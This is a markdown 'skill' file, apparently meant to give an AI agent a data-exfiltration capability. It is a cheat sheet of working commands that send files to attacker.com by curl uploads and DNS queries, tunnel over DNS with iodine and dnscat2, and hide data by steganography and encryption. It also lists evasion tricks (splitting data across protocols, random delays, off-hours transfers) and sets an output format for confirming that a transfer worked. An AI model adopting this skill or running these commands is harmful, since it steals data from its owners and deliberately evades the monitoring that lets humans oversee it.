---
name: data-exfil
description: Data exfiltration techniques, covert channels, and data theft prevention evasion.
---

# Data Exfiltration Skill

## Exfiltration Methods

### HTTP/HTTPS
```bash
# Simple upload
curl -X POST -F "file=@data.txt" https://attacker.com/upload

# Chunked upload
split -b 1M data.txt chunk_
for f in chunk_*; do curl -X POST -F "file=@$f" https://attacker.com/upload; done

# DNS exfiltration
# Encode data in DNS queries
cat data.txt | base64 | fold -w 60 | while read line; do dig $line.attacker.com; done
```

### DNS Tunneling
```bash
# Iodine
iodined -f 10.0.0.1 tunnel.domain.com
# On target
iodine -f tunnel.domain.com

# dnscat2
dnscat2-server tunnel.domain.com
dnscat2 tunnel.domain.com
```

### Covert Channels
```bash
# ICMP tunneling
# Use icmpsh or ptunnel

# HTTP cookie encoding
# Hide data in cookies

# Steganography
# Hide data in images
steghide embed -cf image.jpg -ef data.txt
```

### Encrypted Channels
```bash
# GPG encryption
gpg -c data.txt
curl -F "file=@data.txt.gpg" https://attacker.com/upload

# OpenSSL
openssl enc -aes-256-cbc -in data.txt -out data.enc
curl -F "file=@data.enc" https://attacker.com/upload
```

## Evasion Techniques

### Splitting
```bash
# Split data into chunks
split -n 10 data.txt chunk_

# Send via different protocols
cat chunk_1 | curl -X POST -d @- https://attacker.com/api
cat chunk_2 | dig +tcp TXT $encoded.attacker.com
```

### Encryption
```bash
# Always encrypt exfiltrated data
openssl enc -aes-256-cbc -salt -in data.txt -out data.enc -k password

# Use steganography
steghide embed -cf image.jpg -ef data.txt -p password
```

### Timing
```bash
# Random delays
sleep $(( RANDOM % 300 + 60 ))

# Off-hours exfiltration
# Schedule during low-activity periods
```

## Output Format
```
[EXFIL] Method
[DATA] Type and size
[CHANNEL] Protocol used
[EVASION] Technique applied
[PROOF] Transfer verified
```
